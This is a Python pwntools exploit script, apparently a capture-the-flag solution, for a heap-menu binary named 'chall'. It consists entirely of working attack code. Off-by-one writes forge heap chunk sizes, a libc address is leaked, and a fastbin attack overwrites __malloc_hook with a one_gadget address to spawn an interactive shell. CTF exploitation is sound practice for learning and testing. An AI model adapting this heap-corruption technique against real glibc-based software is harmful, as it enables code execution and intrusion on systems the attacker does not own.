from pwn import *
context.log_level='debug'

def cmd(c):
	p.sendlineafter(">>",str(c))
def add(size,c="A"):
	cmd(1)
	p.sendlineafter(":",str(size))
	p.sendafter(":",c)
def show(idx):
	cmd(2)
	p.sendlineafter("id:",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("id:",str(idx))
	p.sendafter(":",c)
p=process("./chall")
libc=ELF("./chall").libc
add(0x800)#0
add(0x15000+0xa608)#1
add(0x18,"A"*0x18)#2
edit(2,"A"*0x18+'\xc1\x01')
add(0xe00,p64(0x40)*442+p64(0x1fa0)+p64(0x21)*4)#3

edit(2,"A"*0x18+'\xa1\x1f')

add(0x1f00-0x90-0x20)

add(0x18,"A"*0x18)

edit(5,'A'*0x18+'\x21\x01')

add(0x58+0x100,"A"*0x158)

edit(6,"A"*0x158+'\x91\x00\x00')

add(0x200)
add(0x18,'A'*0x18)#8
edit(8,"A"*0x18+'\xff\xff')
add(0x200)
show(9)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b41-0x7ffff7a0d000)
log.warning(hex(base))
libc.address=base
add(0x200,p64(0)*15+p64(0x71)+p64(libc.symbols['__malloc_hook']-35))
add(0x68,p64(0)*13)
one=0x45216
add(0x3e0,"A"+"\x00"*0x3d0)
add(0x68,'\x00'*19+p64(one+base))#12

gdb.attach(p,'b malloc')

p.interactive()





